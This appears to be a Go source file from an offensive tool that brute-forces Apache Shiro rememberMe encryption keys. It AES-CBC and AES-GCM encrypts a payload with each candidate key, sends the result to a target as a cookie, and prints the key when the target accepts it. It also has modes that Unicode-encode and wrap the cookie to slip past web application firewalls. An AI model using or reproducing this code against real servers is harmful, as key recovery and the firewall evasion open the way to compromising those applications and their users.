package Function

import (
	"ShiroKeyCheck/AES_Encrypt"
	"encoding/base64"
	"fmt"
)

func FindTheKey(Shirokeys string, Content []byte, waf string) bool {
	key, _ := base64.StdEncoding.DecodeString(Shirokeys)

	/*	RememberMe1 := AES_Encrypt.AES_CBC_Encrypt(key, Content) //AES CBC加密
		if waf == "u" {
			RememberMe1 = ToUnicode(AES_Encrypt.AES_CBC_Encrypt(key, Content)) //AES CBC加密
		} else waf ==
	*/
	var RememberMe1 string
	switch waf {
	case "u":
		RememberMe1 = ToUnicode(AES_Encrypt.AES_CBC_Encrypt(key, Content))
	case "a":
		RememberMe1 = Annotator(ToUnicode(AES_Encrypt.AES_CBC_Encrypt(key, Content)))
	default:
		RememberMe1 = AES_Encrypt.AES_CBC_Encrypt(key, Content)
	}
	//	fmt.Println("key:" + Shirokeys + "       " + RememberMe1)
	RememberMe2 := AES_Encrypt.AES_GCM_Encrypt(key, Content) //AES GCM加密
	//	fmt.Println("key:" + Shirokeys + "       " + RememberMe2)
	if HttpRequset(RememberMe1) {
		fmt.Println("Find the Key!")
		fmt.Println("[+] CBC-KEY:", Shirokeys)
		//		fmt.Println("[+] rememberMe=", RememberMe1)
		return true
	}
	if HttpRequset(RememberMe2) {
		fmt.Println("Find the Key!")
		fmt.Println("[+] GCM-KEY:", Shirokeys)
		//		fmt.Println("[+] rememberMe=", RememberMe2)
		return true
	}
	return false
}
